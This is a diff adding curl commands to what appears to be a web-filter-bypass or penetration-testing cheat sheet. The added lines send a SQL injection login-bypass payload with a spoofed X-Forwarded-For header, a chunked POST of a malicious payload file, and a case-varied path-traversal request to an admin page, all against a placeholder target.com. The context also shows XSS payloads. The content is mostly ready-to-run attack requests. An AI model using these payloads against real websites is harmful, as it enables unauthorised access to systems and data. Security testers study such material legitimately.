@@ -121,6 +121,22 @@ User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
 X-Forwarded-For, X-Originating-IP, or User-Agent
 
 curl --header "Host: target.com" http://IP-ADDRESS
+
+curl -X POST "https://target.com/login" \  
+-H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \  
+-H "X-Forwarded-For: 127.0.0.1" \  
+-H "Accept-Language: en-US,en;q=0.9" \  
+-H "Content-Type: application/json" \  
+--data-raw '{"username":"admin'\'' OR 1=1--", "password":"any"}'
+
+curl -X GET "https://target.com/admin" \  
+-H "Random-Header: $(openssl rand -hex 8)" \  
+-H "Referer: https://google.com"
+
+curl -X POST "https://target.com/api" \  
+-H "Transfer-Encoding: chunked" \  
+--data-binary @malicious_payload.txt
+
 Try IPv6 if the website has IPv6 enabled.
 
 ```
@@ -134,6 +150,9 @@ GET /search?q=<script>alert(1)</script>
 
 #case variation allowed
 GET /search?q=<ScRiPt>alert(1)</ScRiPt>
+
+curl -X GET "https://target.com/ADMIN/../LoGiN" \  
+-H "User-Agent: cURL/7.68.0"
 ```
 
  
